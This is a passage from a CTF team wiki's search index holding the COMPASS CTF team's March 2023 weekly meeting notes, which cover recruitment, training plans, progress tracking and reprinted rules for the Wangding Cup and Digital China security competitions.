\u4e8c\u8fdb\u5236\u6f0f\u6d1e\u5229\u7528\u57fa\u7840\uff1b</p> <p>\\9. Docker\u5bb9\u5668\u5b89\u5168\u4e0e\u5bb9\u5668\u7ba1\u7406\uff1b</p> <p>\\10. \u66f4\u591a\u5185\u5bb9\u6b63\u5728\u8865\u5145\u2026\u2026</p> <p>\u52a0\u5165SUSTech CTF &amp; Infosec \u7231\u597d\u8005\u8054\u76df\u7fa4\u7ec4\u83b7\u53d6\u6709\u5173\u6d3b\u52a8\u7684\u66f4\u591a\u4fe1\u606f\uff1a787427165\u3002\u4e8c\u7ef4\u7801\u56fe\u7247\u5982\u4e0b\u3002</p> <p>\u6bcf\u5468\u65e5\u4e0b\u534814:00-18:00\u5c06\u4f1a\u5728\u5de5\u5b66\u9662\u5357\u697c551\u4f1a\u8bae\u5ba4\u8fdb\u884c\u6821\u961f\u6210\u5458\u8fdb\u9636\u8bad\u7ec3\uff0c\u540c\u6837\u6b22\u8fce\u7231\u597d\u8005\u53c2\u4e0e\u5b66\u4e60\u3002</p> <p>\u672c\u5468\u65e5\u665a20:00-21:00\u5c06\u8fdb\u884c\u7ebf\u4e0a\u6d3b\u52a8\u5ba3\u4f20\u4f1a\u8bae\uff0c\u5c06\u5728\u817e\u8baf\u4f1a\u8bae\u8fdb\u884c\uff1a448-489-4504\uff0c\u6216\u4f7f\u7528\u94fe\u63a5\u76f4\u63a5\u8fdb\u5165\u4f1a\u8bae\uff1a https://meeting.tencent.com/p/4484894504 \u3002</p> <p>\u6b22\u8fce\u540c\u5b66\u4eec\u901a\u8fc7\u670b\u53cb\u5708\u3001QQ\u7a7a\u95f4\u7b49\u65b9\u5f0f\u8fdb\u884c\u5185\u5bb9\u5206\u4eab\u53ca\u8f6c\u53d1\uff0c\u652f\u6301\u5927\u5bb6\u7684\u5ba3\u4f20\u534f\u52a9\uff0c\u53d1\u9001\u670b\u53cb\u5708/\u8bf4\u8bf4/\u5176\u4ed6\u63a8\u5e7f\u53ef\u5728\u5468\u65e5\u7ebf\u4e0b\u8bad\u7ec3\u73b0\u573a\u9886\u53d6\u53ef\u53ef\u7231\u7231\u5c0f\u8d34\u7eb8\u4e00\u4efd\uff0c\u70b9\u8d5e\u6570\u8d85\u8fc750\u53ef\u4ee5\u989d\u5916\u83b7\u5f9764GB\u6e17\u900f\u5de5\u5177\u5305U\u76d8\u4e00\u4efd\u4f5c\u4e3a\u793c\u54c1\u3002\u5ba3\u4f20\u6d77\u62a5\u5982\u4e0b\u3002</p> <p>\u76f8\u5173\u94fe\u63a5\uff1a</p> <p>\\1. COMPASS\u5b9e\u9a8c\u5ba4\u5b98\u65b9\u7f51\u7ad9\uff1a https://compass.sustech.edu.cn/ \uff1b</p> <p>\\2. COMPASS CTF\u6821\u961fWiki\uff1a https://wiki.compass.college/ \uff1b</p> <p>\\3. COMPASS CTF\u7ebf\u4e0a\u9898\u76ee\u7ec3\u4e60\u5e73\u53f0\uff1a http://detroit.sustech.edu.cn/ \uff08\u6821\u5916\u8bbf\u95ee\uff09 / http://116.7.234.225/ \uff08\u6821\u5185\u8bbf\u95ee\uff09\uff1b</p> <p>\\4. COMPASS CTF\u7ebf\u4e0a\u8d5b\u4e8b\u5e73\u53f0\uff1a http://detroit.sustech.edu.cn:29998/ \uff08\u6821\u5916\u8bbf\u95ee\uff09 / http://116.7.234.225:29998/ \uff08\u6821\u5185\u8bbf\u95ee\uff09\uff1b</p> <p>\u795d\u5927\u5bb6\u5b66\u6709\u6240\u6210\uff0c\u5171\u540c\u8fdb\u6b65\u3002</p> <p>\u8ba1\u7b97\u673a\u7cfb\u7edf\u4e0e\u5b89\u5168\u5b9e\u9a8c\u5ba4\uff0cCOMPASS CTF\u7f51\u7edc\u5b89\u5168\u7ade\u8d5b\u961f\u4f0d</p> <p>\u674e\u7167</p> <p></p> <p>These are the emails that will be sent to all undergraduates, and we are currently fighting with the compasslab email service that sends mass emails, so you will receive similar emails later.</p> <p>We will start our first online presentation this weekend at 20:00, and we will also record and archive the presentation for later viewing. The content of this event is: CTF introductory guide and hacking spirit.</p>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-03-09/#0x4-upcoming-events","title":"0x4. Upcoming Events","text":"<p>https://mp.weixin.qq.com/s?__biz=MzkyNDA5NjgyMg==&amp;mid=2247495188&amp;idx=1&amp;sn=9883d07a787f36a7de1ce164a5a280af&amp;chksm=c1d9ae4df6ae275b4530724a2ba1ce0524863cc62b26f25bc9c06d1ad74d8430f1b664140086&amp;mpshare=1&amp;scene=23&amp;srcid=0306DosSvZInXqEwrQStS4vj&amp;sharer_sharetime=1678109644023&amp;sharer_shareid=e090099e1f84145c26d4ec5fa4a73e51#rd</p> <p>https://mp.weixin.qq.com/s/7OKn0HDs6E90TyfQJfjNeA</p>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-03-09/#wrap-up","title":"Wrap-up","text":"<p>We discussed the wiki page adjustments and the recruitment of newcomers, and the COMPASS CTF 2022 awards will be given out this week. This week's events include the 2023 Digital China Innovation Competition - Digital Talent track, and everyone is invited to participate.</p>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-03-16/","title":"CTF Week Meeting 2023-03-16","text":"<p>This week we officially started the recruitment program, and the program is going very well, we have more than 20 new students who are learning the basic content tutorials, and when the basic content teaching is completed, April 1 and 2 will be tested. We are also looking forward to the participation of the varsity students in this week's training, which will be an introduction to the Ether and Solidity languages (blockchain).</p>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-03-16/#work-progress-tracking","title":"Work progress tracking","text":"<ol> <li>COMPASS CTF 2022 - 100%</li> <li>Topic: CTF combined with research - 20%</li> <li>Multi-platform promotion of COMPASS CTF - 20%</li> <li>New Platform GZCTF - 55%</li> <li>Wiki page content adjustment - 60%</li> <li>CTFtime program: play CTF and share - 20%</li> <li>New Member Recruitment - 50%</li> <li>Ande Cup CTF game - 13%</li> <li>Remedial content session - 45%</li> <li>CTF from Practice to Principle - 3%</li> <li>National College Student Information Security Contest - 10%</li> <li>Wangding Cup Semi-Final Competition - 20%</li> <li>Wangding Cup &amp; Guangdong CTF &amp; AI Mid-Exam Time Conflict - 0% brief idea</li> <li>Discussions with Other Universities about National College Student Information Software Competition - 0% brief idea</li> </ol>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-03-16/#what-we-discussed-this-week","title":"What we discussed this week","text":"<ol> <li>Wangding Cup Semi-Final Competition.</li> <li>New Member Recruitment.</li> <li>Competition and Events.</li> </ol>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-03-16/#0x1-wangding-cup-semi-final-competition","title":"0x1. Wangding Cup Semi-Final Competition","text":"<p>https://mp.weixin.qq.com/s/H5BcT6A5BRTH1wZqi4YeEA</p>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-03-16/#_1","title":"\u3010\u516c\u544a\u3011\u7b2c\u4e09\u5c4a\u201c\u7f51\u9f0e\u676f\u201d\u7f51\u7edc\u5b89\u5168\u5927\u8d5b\u534a\u51b3\u8d5b\u3001\u603b\u51b3\u8d5b\u8d5b\u5236\u4ecb\u7ecd","text":"<p>\u4f9d\u7167\u300a2022\u7b2c\u4e09\u5c4a\u201c\u7f51\u9f0e\u676f\u201d\u7f51\u7edc\u5b89\u5168\u5927\u8d5b\u89c4\u5219\u300b\uff0c\u534a\u51b3\u8d5b\u53ca\u603b\u51b3\u8d5b\u91c7\u7528\u591a\u79cd\u8d5b\u5236\u878d\u5408\u7684\u7ade\u8d5b\u6a21\u5f0f\uff0c\u65f6\u957f\u5747\u4e3a8\u5c0f\u65f6\uff0c\u534a\u51b3\u8d5b\u6bd4\u8d5b\u65f6\u95f4\u4e3a4\u670814\u65e510:00-18:00\uff0c\u603b\u51b3\u8d5b\u6bd4\u8d5b\u65f6\u95f4\u4e3a4\u670815\u65e59:00-17:00\u3002</p> <p>\u534a\u51b3\u8d5b\u5404\u5206\u7ec4\u5185\u6392\u540d\u524d12\u7684\u6218\u961f\uff0c\u4ee5\u53ca\u5728\u5269\u4f59\u6218\u961f\u4e2d\u603b\u79ef\u5206\u9760\u524d\u76842\u652f\u6218\u961f\uff0c\u5171\u8ba150\u652f\u664b\u7ea7\u603b\u51b3\u8d5b\u3002\u603b\u51b3\u8d5b\u4e0d\u518d\u5206\u7ec4\uff0c\u6309\u7167\u6bd4\u8d5b\u5f97\u5206\u7531\u9ad8\u81f3\u4f4e\u786e\u8ba4\u6700\u7ec8\u6392\u540d\u3002</p> <p>\u4e00\u3001\u534a\u51b3\u8d5b\u8d5b\u5236</p> <p>\u534a\u51b3\u8d5b\u91c7\u7528\u201c\u5171\u540c\u9632\u5fa1+\u5b9e\u666f\u9632\u5fa1\uff08RDG\uff09+\u4eba\u5de5\u667a\u80fd\u6f0f\u6d1e\u6316\u6398\uff08RHG\uff09+\u7a81\u7834+\u4e91\u5883\u9776\u573a\u6311\u6218\u201d\u7b49\u591a\u79cd\u8d5b\u5236\u76f8\u878d\u5408\u7684\u7ade\u6280\u65b9\u5f0f\u3002</p> <p>\u5176\u4e2d\u201c\u5171\u540c\u9632\u5fa1\u201d\u573a\u666f\u4e2d\u65b0\u589e\u201c\u60c5\u62a5\u5171\u4eab\u5e73\u53f0\u201d\uff0c\u501f\u9274\u7f51\u7edc\u653b\u51fb\u7684\u70ed\u70b9\u4e8b\u4ef6\u8bbe\u8ba1\u573a\u666f\uff0c\u53c2\u4e0e\u6f14\u7ec3\u7684\u5404\u754c\u53c2\u8d5b\u9009\u624b\u534f\u540c\u8054\u52a8\uff0c\u5171\u540c\u5e94\u5bf9\u7f51\u7edc\u5b89\u5168\u5a01\u80c1\u3002</p> <p>\uff08\u53c2\u8003\u539f\u6587\uff09</p> <p>\u4e8c\u3001\u603b\u51b3\u8d5b\u8d5b\u5236</p> <p>\u603b\u51b3\u8d5b\u4f9d\u65e7\u91c7\u7528\u591a\u79cd\u8d5b\u5236\u76f8\u878d\u5408\u7684\u7ade\u6280\u65b9\u5f0f\uff0c\u664b\u7ea7\u9009\u624b\u5c06\u4e0d\u518d\u5206\u7ec4\uff0c\u5404\u961f\u9009\u624b\u5171\u540c\u89d2\u9010\u7f51\u9f0e\u676f\u6700\u9ad8\u8363\u8a89\u3002</p> <p>\uff08\u53c2\u8003\u539f\u6587\uff09</p> <p>\u4e09\u3001\u79ef\u5206\u6a21\u5f0f</p> <p>\u534a\u51b3\u8d5b\u548c\u603b\u51b3\u8d5b\u79ef\u5206\u6a21\u5f0f\u5982\u4e0b\uff1a</p> <p>\uff08\u53c2\u8003\u539f\u6587\uff09</p> <p>\u56db\u3001\u5176\u4ed6\u89c4\u5219</p> <ol> <li> <p>\u6bd4\u8d5b\u5f53\u5929\u6240\u6709\u53c2\u8d5b\u9009\u624b\u9700\u6301\u8eab\u4efd\u8bc1\u539f\u4ef6\u5230\u8fbe\u6bd4\u8d5b\u73b0\u573a\uff0c\u8fdf\u5230\u8d85\u534a\u5c0f\u65f6\u7981\u6b62\u5165\u573a\u3002</p> </li> <li> <p>\u88c1\u5224\u6709\u6743\u6839\u636e\u73b0\u573a\u60c5\u51b5\u5bf9\u8fdd\u89c4\u3001\u8fdd\u7eaa\u6218\u961f\u8fdb\u884c\u51cf\u5206\u5904\u7406\u3002</p> </li> <li> <p>\u6bd4\u8d5b\u8fc7\u7a0b\u4e2d\u8bf7\u968f\u65f6\u5173\u6ce8\u7b54\u9898\u9875\u9762\u7684\u516c\u544a\u680f\uff0c\u6240\u6709\u6267\u884c\u89c4\u5219\u53ca\u5224\u7f5a\u4ee5\u6700\u65b0\u516c\u544a\u4e3a\u51c6\u3002</p> </li> <li> <p>\u6bd4\u8d5b\u8fc7\u7a0b\u4e2d\u5bf9\u5e73\u53f0\u6216\u9898\u76ee\u6709\u95ee\u9898\uff0c\u53ef\u4ee5\u5728\u7b54\u9898\u9875\u9762\u7aef\u70b9\u51fb\u201c\u547c\u53eb\u88c1\u5224\u201d\u6309\u94ae\u53cd\u9988\u95ee\u9898\uff0c\u8bf7\u63cf\u8ff0\u6e05\u695a\u9047\u5230\u7684\u95ee\u9898\uff0c\u5426\u5219\u53ef\u80fd\u5f71\u54cd\u5e94\u7b54\u6548\u7387\u3002\u7981\u6b62\u968f\u610f\u5728\u573a\u5185\u8d70\u52a8\u3002</p> </li> <li> <p>\u4e3a\u7ef4\u62a4\u73b0\u573a\u79e9\u5e8f\uff0c\u907f\u514d\u8de8\u6218\u961f\u4ea4\u6d41\uff0c\u53bb\u6d17\u624b\u95f4\u8bf7\u4e3e\u624b\u793a\u610f\uff0c\u7ecf\u8fc7\u5de5\u4f5c\u4eba\u5458\u786e\u8ba4\u540e\u53ef\u4ee5\u51ed\u7533\u8bf7\u4eba\u53c2\u8d5b\u8bc1\u4ece\u76f8\u5e94\u51fa\u53e3\u6709\u79e9\u5e8f\u53bb\u6d17\u624b\u95f4\u3002</p> </li> </ol> <p>\u7b2c\u4e09\u5c4a\u201c\u7f51\u9f0e\u676f\u201d\u7f51\u7edc\u5b89\u5168\u5927\u8d5b\u7ec4\u59d4\u4f1a</p> <p>2023\u5e743\u6708</p>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-03-16/#0x2-new-member-recruitment","title":"0x2. New Member Recruitment","text":"<p>The recruitment pattern for new members this semester is</p> <ol> <li> <p>three-week online learning of basic content, with records, kept through Tencent meetings and video recording and used for future basic content review teaching.</p> </li> <li> <p>a two-day assessment session in the format of Jeopardy, which will be conducted using the COMPASS tournament platform.</p> </li> </ol> <p>The number of new members recruited this semester is about 5.</p>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-03-16/#0x3-competition-and-events","title":"0x3. Competition and Events","text":""},{"location":"Meeting/CTF%20Week%20Meeting%202023-03-16/#_2","title":"\u6570\u5b57\u4e2d\u56fd\u00b7\u6570\u636e\u5b89\u5168\u4ea7\u4e1a\u89e3\u51b3\u65b9\u6848\u521b\u65b0\u8d5b\uff08\u521d\u8d5b\uff09","text":"<p>\u672c\u8d5b\u9053\u4ee5\u5207\u5b9e\u89e3\u6c7a\u6570\u636e\u5b89\u5168\u4ea7\u4e1a\u53d1\u5c55\u4e2d\u7684\u5b9e\u9645\u95ee\u9898\u4e3a\u76ee\u6807\uff0e\u6709\u529b\u63a8\u52a8\u6570\u636e\u5b89\u5168\u4ea7\u4e1a\u53d1\u5c55\uff0c\u53d1\u6325\u6570\u636e\u5b89\u5168\u6280\u672f\u521b\u65b0\u3001\u6210\u679c\u8f6c\u5316\u3001\u4eba\u624d\u57f9\u517b\u7b49\u5178\u578b\u793a\u8303\u5e26\u52a8\u4f5c\u7528\u3001\u63a8\u5e7f\u4f18\u79c0\u7ecf\u9a8c\u548c\u6210\u679c\uff0c\u52a9\u529b\u6211\u56fd\u6570\u636e\u5b89\u5168\u4ea7\u4e1a\u53d1\u5c55\u3002</p>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-03-16/#_3","title":"\u6bd4\u8d5b\u94fe\u63a5","text":"<p>\u5b98\u65b9\u6bd4\u8d5b\u94fe\u63a5\u5730\u5740\uff1ahttps://www.dcic-china.com/competitions/10078</p>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-03-16/#_4","title":"\u6bd4\u8d5b\u65f6\u95f4","text":"<p>\u7ebf\u4e0a\u8d5b\u65f6\u95f4\uff1a2023-03-27 00:00:00 - 2023-04-07 00:00:00</p>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-03-16/#_5","title":"\u8d5b\u4e8b\u673a\u6784","text":"<p>\u672c\u6b21\u6bd4\u8d5b\u4e3b\u529e\u65b9\uff1a\u798f\u5efa\u7701\u901a\u4fe1\u7ba1\u7406\u5c40</p> <p>\u6307\u5bfc\u5355\u4f4d\uff1a\u6570\u5b57\u4e2d\u56fd\u5efa\u8bbe\u5cf0\u4f1a\u7ec4\u59d4\u4f1a</p> <p>\u627f\u529e\u5355\u4f4d\uff1a\u4e2d\u56fd\u7535\u5b50\u4fe1\u606f\u4ea7\u4e1a\u53d1\u5c55\u7814\u7a76\u9662\u3001\u4e2d\u56fd\u8f6f\u4ef6\u8bc4\u6d4b\u4e2d\u5fc3\u3001\u5de5\u4e1a\u548c\u4fe1\u606f\u5316\u90e8\u6559\u80b2\u4e0e\u8003\u8bd5\u4e2d\u5fc3</p> <p>\u534f\u529e\u5355\u4f4d\uff1a\u4e2d\u56fd\u8ba1\u7b97\u673a\u884c\u4e1a\u534f\u4f1a\u6570\u636e\u5b89\u5168\u4e13\u4e1a\u59d4\u5458\u4f1a\u3001\u5317\u4eac\u6c38\u4fe1\u81f3\u8bda\u79d1\u6280\u80a1\u4efd\u6709\u9650\u516c\u53f8</p> <p>\u652f\u6301\u5355\u4f4d\uff1a\u8682\u8681\u96c6\u56e2\u3001\u4e2d\u5b5a\u4fe1\u606f\u80a1\u4efd\u6709\u9650\u516c\u53f8\u3001360\u6570\u5b57\u5b89\u5168\u79d1\u6280\u96c6\u56e2\u6709\u9650\u516c\u53f8\u3001\u5317\u4eac\u957f\u4ead\u79d1\u6280\u6709\u9650\u516c\u53f8\u3001\u817e\u8baf\u4e91\u8ba1\u7b97\uff08\u5317\u4eac\uff09\u6709\u9650\u8d23\u4efb\u516c\u53f8\u3001\u8fdc\u6c5f\u76db\u90a6\uff08\u5317\u4eac\uff09\u7f51\u7edc\u5b89\u5168\u79d1\u6280\u80a1\u4efd\u6709\u9650\u516c\u53f8\u3001\u5317\u4eac\u4f17\u5b89\u5929\u4e0b\u79d1\u6280\u6709\u9650\u516c\u53f8\u3001\u5317\u4eac\u65f6\u4ee3\u65b0\u5a01\u4fe1\u606f\u6280\u672f\u6709\u9650\u516c\u53f8</p>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-03-16/#_6","title":"\u6bd4\u8d5b\u5f62\u5f0f","text":"<p>\u521b\u65b0\u8d5b\u91c7\u7528\u516c\u5f00\u5f0f\u7ade\u8d5b\uff0c\u56f4\u7ed5\u6570\u636e\u5b89\u5168\u6cbb\u7406\uff0c\u53c2\u8d5b\u5355\u4f4d\u63d0\u4ea4\u5b9e\u8df5\u6848\u4f8b\u3002\u8d5b\u4e8b\u5206\u9884\u8d5b\u548c\u51b3\u8d5b\u3002\u9884\u8d5b\u9636\u6bb5\u4e13\u5bb6\u7ec4\u8bc4\u59d4\u5c06\u91c7\u53d6\u8fdc\u7a0b\u767b\u5f55\u6216\u672c\u5730\u5b89\u88c5\u7684\u65b9\u5f0f\u8fd0\u884c\u53c2\u8d5b\u4f5c\u54c1\uff0c\u4f9d\u636e\u8d5b\u4e8b\u4e13\u5bb6\u5236\u5b9a\u7684\u6bd4\u8d5b\u8bc4\u5ba1\u6807\u51c6\u8fdb\u884c\u6253\u5206\uff0c\u6839\u636e\u5f97\u5206\u6392\u540d\u786e\u5b9a\u51b3\u8d5b\u540d\u5355\u3002\u51b3\u8d5b\u91c7\u7528\u7b54\u8fa9\u7684\u5f62\u5f0f\uff0c\u7531\u8d5b\u4e8b\u4e13\u5bb6\u7ec4\u5bf9\u9884\u8d5b\u5165\u56f4\u65b9\u6848\u8fdb\u884c\u8bc4\u5ba1\u3002</p>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-03-16/#_7","title":"\u6570\u5b57\u4e2d\u56fd\u00b7\u6570\u636e\u5b89\u5168\u4ea7\u4e1a\u4eba\u624d\u80fd\u529b\u6311\u6218\u8d5b\uff08\u521d\u8d5b\uff09","text":"<p>\u672c\u8d5b\u9053\u4ee5\u5207\u5b9e\u89e3\u6c7a\u6570\u636e\u5b89\u5168\u4ea7\u4e1a\u53d1\u5c55\u4e2d\u7684\u5b9e\u9645\u95ee\u9898\u4e3a\u76ee\u6807\uff0e\u6709\u529b\u63a8\u52a8\u6570\u636e\u5b89\u5168\u4ea7\u4e1a\u53d1\u5c55\uff0c\u53d1\u6325\u6570\u636e\u5b89\u5168\u6280\u672f\u521b\u65b0\u3001\u6210\u679c\u8f6c\u5316\u3001\u4eba\u624d\u57f9\u517b\u7b49\u5178\u578b\u793a\u8303\u5e26\u52a8\u4f5c\u7528\u3001\u63a8\u5e7f\u4f18\u79c0\u7ecf\u9a8c\u548c\u6210\u679c\uff0c\u52a9\u529b\u6211\u56fd\u6570\u636e\u5b89\u5168\u4ea7\u4e1a\u53d1\u5c55\u3002</p>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-03-16/#_8","title":"\u6bd4\u8d5b\u94fe\u63a5","text":"<p>\u5b98\u65b9\u6bd4\u8d5b\u94fe\u63a5\u5730\u5740\uff1a\u6682\u65e0</p>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-03-16/#_9","title":"\u6bd4\u8d5b\u65f6\u95f4","text":"<p>\u7ebf\u4e0a\u8d5b\u62a5\u540d\uff1a2023-03-06 00:00:00 - 2023-03-22 00:00:00</p> <p>\u7ebf\u4e0a\u8d5b\u65f6\u95f4\uff1a2023-04-01 00:00:00 - 2023-04-01 00:00:00</p>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-03-16/#_10","title":"\u8d5b\u4e8b\u673a\u6784","text":"<p>\u672c\u6b21\u6bd4\u8d5b\u4e3b\u529e\u65b9\uff1a\u798f\u5efa\u7701\u901a\u4fe1\u7ba1\u7406\u5c40</p> <p>\u6307\u5bfc\u5355\u4f4d\uff1a\u6570\u5b57\u4e2d\u56fd\u5efa\u8bbe\u5cf0\u4f1a\u7ec4\u59d4\u4f1a</p> <p>\u627f\u529e\u5355\u4f4d\uff1a\u4e2d\u56fd\u7535\u5b50\u4fe1\u606f\u4ea7\u4e1a\u53d1\u5c55\u7814\u7a76\u9662\u3001\u4e2d\u56fd\u8f6f\u4ef6\u8bc4\u6d4b\u4e2d\u5fc3\u3001\u5de5\u4e1a\u548c\u4fe1\u606f\u5316\u90e8\u6559\u80b2\u4e0e\u8003\u8bd5\u4e2d\u5fc3</p> <p>\u534f\u529e\u5355\u4f4d\uff1a\u4e2d\u56fd\u8ba1\u7b97\u673a\u884c\u4e1a\u534f\u4f1a\u6570\u636e\u5b89\u5168\u4e13\u4e1a\u59d4\u5458\u4f1a\u3001\u5317\u4eac\u6c38\u4fe1\u81f3\u8bda\u79d1\u6280\u80a1\u4efd\u6709\u9650\u516c\u53f8</p> <p>\u652f\u6301\u5355\u4f4d\uff1a\u8682\u8681\u96c6\u56e2\u3001\u4e2d\u5b5a\u4fe1\u606f\u80a1\u4efd\u6709\u9650\u516c\u53f8\u3001360\u6570\u5b57\u5b89\u5168\u79d1\u6280\u96c6\u56e2\u6709\u9650\u516c\u53f8\u3001\u5317\u4eac\u957f\u4ead\u79d1\u6280\u6709\u9650\u516c\u53f8\u3001\u817e\u8baf\u4e91\u8ba1\u7b97\uff08\u5317\u4eac\uff09\u6709\u9650\u8d23\u4efb\u516c\u53f8\u3001\u8fdc\u6c5f\u76db\u90a6\uff08\u5317\u4eac\uff09\u7f51\u7edc\u5b89\u5168\u79d1\u6280\u80a1\u4efd\u6709\u9650\u516c\u53f8\u3001\u5317\u4eac\u4f17\u5b89\u5929\u4e0b\u79d1\u6280\u6709\u9650\u516c\u53f8\u3001\u5317\u4eac\u65f6\u4ee3\u65b0\u5a01\u4fe1\u606f\u6280\u672f\u6709\u9650\u516c\u53f8</p>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-03-16/#_11","title":"\u6bd4\u8d5b\u5f62\u5f0f","text":"<p>\u7531\u7406\u8bba\u77e5\u8bc6\u548c\u6280\u80fd\u64cd\u4f5c\u4e24\u90e8\u5206\u7ec4\u6210\u3002\u7406\u8bba\u90e8\u5206\u6db5\u76d6\u653f\u7b56\u6cd5\u89c4\u548c\u6570\u636e\u5b89\u5168\u57fa\u7840\u77e5\u8bc6\uff1b\u6280\u80fd\u64cd\u4f5c\u90e8\u5206\u6db5\u76d6\u6570\u636e\u8bc6\u522b\u3001\u6743\u9650\u63a7\u5236\u3001\u8106\u5f31\u6027\u5206\u6790\u7b49\u65b9\u5411\uff0c\u7efc\u5408\u8003\u5bdf\u53c2\u8d5b\u8005\u4e0d\u540c\u7ef4\u5ea6\u7684\u6570\u636e\u5b89\u5168\u80fd\u529b\u6c34\u5e73\u3002</p>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-03-16/#wrap-up","title":"Wrap-up","text":"<p>This week we officially started the recruitment program, and the program is going very well, we have more than 20 new students who are learning the basic content tutorials, and when the basic content teaching is completed, April 1 and 2 will be tested. We are also looking forward to the participation of the varsity students in this week's training, which will be an introduction to the Ether and Solidity languages (blockchain).</p>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-03-23/","title":"CTF Week Meeting 2023-03-23","text":"<p>I'm back from illness currently. Next month we are going to play Wangding Cup Semi-Final / Final in Hangzhou. We are also looking forward to the participation of the varsity students in this week's training, which will be an introduction to the Ether and Solidity languages (blockchain).</p>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-03-23/#work-progress-tracking","title":"Work progress tracking","text":"<ol> <li>Topic: CTF combined with research - 20%</li> <li>Multi-platform promotion of COMPASS CTF - 20%</li> <li>New Platform GZCTF - 55%</li> <li>Wiki page content adjustment - 60%</li> <li>CTFtime program: play CTF and share - 23%</li> <li>New Member Recruitment - 50%</li> <li>Ande Cup CTF game - 13%</li> <li>Remedial content session - 54%</li> <li>CTF from Practice to Principle - 3%</li> <li>National College Student Information Security Contest - 20%</li> <li>Wangding Cup Semi-Final Competition - 50%</li> <li>Wangding Cup &amp; Guangdong CTF &amp; AI Mid-Exam Time Conflict - 10%</li> <li>Discussions with Other Universities about National College Student Information Software Competition - 5%</li> </ol>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-03-23/#what-we-discussed-this-week","title":"What we discussed this week","text":"<ol> <li>Wangding Cup &amp; Guangdong CTF &amp; AI Mid-Exam Time Conflict.</li> <li>Remedial content session.</li> <li>Competition and Events.</li> </ol>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-03-23/#0x1-wangding-cup-semi-final-competition","title":"0x1. Wangding Cup Semi-Final Competition","text":"<p>https://mp.weixin.qq.com/s/H5BcT6A5BRTH1wZqi4YeEA</p>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-03-23/#_1","title":"\u3010\u516c\u544a\u3011\u7b2c\u4e09\u5c4a\u201c\u7f51\u9f0e\u676f\u201d\u7f51\u7edc\u5b89\u5168\u5927\u8d5b\u534a\u51b3\u8d5b\u3001\u603b\u51b3\u8d5b\u8d5b\u5236\u4ecb\u7ecd","text":"<p>\u4f9d\u7167\u300a2022\u7b2c\u4e09\u5c4a\u201c\u7f51\u9f0e\u676f\u201d\u7f51\u7edc\u5b89\u5168\u5927\u8d5b\u89c4\u5219\u300b\uff0c\u534a\u51b3\u8d5b\u53ca\u603b\u51b3\u8d5b\u91c7\u7528\u591a\u79cd\u8d5b\u5236\u878d\u5408\u7684\u7ade\u8d5b\u6a21\u5f0f\uff0c\u65f6\u957f\u5747\u4e3a8\u5c0f\u65f6\uff0c\u534a\u51b3\u8d5b\u6bd4\u8d5b\u65f6\u95f4\u4e3a4\u670814\u65e510:00-18:00\uff0c\u603b\u51b3\u8d5b\u6bd4\u8d5b\u65f6\u95f4\u4e3a4\u670815\u65e59:00-17:00\u3002</p> <p>\u534a\u51b3\u8d5b\u5404\u5206\u7ec4\u5185\u6392\u540d\u524d12\u7684\u6218\u961f\uff0c\u4ee5\u53ca\u5728\u5269\u4f59\u6218\u961f\u4e2d\u603b\u79ef\u5206\u9760\u524d\u76842\u652f\u6218\u961f\uff0c\u5171\u8ba150\u652f\u664b\u7ea7\u603b\u51b3\u8d5b\u3002\u603b\u51b3\u8d5b\u4e0d\u518d\u5206\u7ec4\uff0c\u6309\u7167\u6bd4\u8d5b\u5f97\u5206\u7531\u9ad8\u81f3\u4f4e\u786e\u8ba4\u6700\u7ec8\u6392\u540d\u3002</p> <p>\u4e00\u3001\u534a\u51b3\u8d5b\u8d5b\u5236</p> <p>\u534a\u51b3\u8d5b\u91c7\u7528\u201c\u5171\u540c\u9632\u5fa1+\u5b9e\u666f\u9632\u5fa1\uff08RDG\uff09+\u4eba\u5de5\u667a\u80fd\u6f0f\u6d1e\u6316\u6398\uff08RHG\uff09+\u7a81\u7834+\u4e91\u5883\u9776\u573a\u6311\u6218\u201d\u7b49\u591a\u79cd\u8d5b\u5236\u76f8\u878d\u5408\u7684\u7ade\u6280\u65b9\u5f0f\u3002</p> <p>\u5176\u4e2d\u201c\u5171\u540c\u9632\u5fa1\u201d\u573a\u666f\u4e2d\u65b0\u589e\u201c\u60c5\u62a5\u5171\u4eab\u5e73\u53f0\u201d\uff0c\u501f\u9274\u7f51\u7edc\u653b\u51fb\u7684\u70ed\u70b9\u4e8b\u4ef6\u8bbe\u8ba1\u573a\u666f\uff0c\u53c2\u4e0e\u6f14\u7ec3\u7684\u5404\u754c\u53c2\u8d5b\u9009\u624b\u534f\u540c\u8054\u52a8\uff0c\u5171\u540c\u5e94\u5bf9\u7f51\u7edc\u5b89\u5168\u5a01\u80c1\u3002</p> <p>\uff08\u53c2\u8003\u539f\u6587\uff09</p> <p>\u4e8c\u3001\u603b\u51b3\u8d5b\u8d5b\u5236</p> <p>\u603b\u51b3\u8d5b\u4f9d\u65e7\u91c7\u7528\u591a\u79cd\u8d5b\u5236\u76f8\u878d\u5408\u7684\u7ade\u6280\u65b9\u5f0f\uff0c\u664b\u7ea7\u9009\u624b\u5c06\u4e0d\u518d\u5206\u7ec4\uff0c\u5404\u961f\u9009\u624b\u5171\u540c\u89d2\u9010\u7f51\u9f0e\u676f\u6700\u9ad8\u8363\u8a89\u3002</p> <p>\uff08\u53c2\u8003\u539f\u6587\uff09</p> <p>\u4e09\u3001\u79ef\u5206\u6a21\u5f0f</p> 